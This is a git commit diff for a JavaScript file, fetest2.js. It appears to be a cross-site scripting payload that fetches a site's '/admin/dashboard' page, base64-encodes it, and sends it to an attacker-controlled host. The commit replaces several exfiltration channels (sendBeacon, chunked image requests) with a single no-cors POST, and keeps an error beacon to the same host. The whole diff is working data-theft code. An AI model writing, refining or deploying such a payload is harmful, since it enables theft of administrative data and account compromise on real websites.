356135949b4f0d8b9d9aa05c93c321dff9733b22
hackerwahab <hackertabish786@gmail.com>
2026-02-21 07:23:43 +0500

    Update and rename fetest1.js to fetest2.js

--- fetest2.js
+++ fetest2.js
@@ -4,11 +4,7 @@
     var r=await fetch('/admin/dashboard');
     var t=await r.text();
     var b=btoa(unescape(encodeURIComponent(t)));
-    navigator.sendBeacon('//'+c+'/dash',b);
-    fetch('//'+c+'/post',{method:'POST',body:b,mode:'no-cors'});
-    for(var i=0;i<b.length;i+=1900){
-      new Image().src='//'+c+'/c?i='+Math.floor(i/1900)+'&d='+encodeURIComponent(b.substring(i,i+1900));
-    }
+    fetch('//'+c,{method:'POST',body:b,mode:'no-cors'});
   }catch(e){
     new Image().src='//'+c+'/err?e='+encodeURIComponent(e.message);
   }
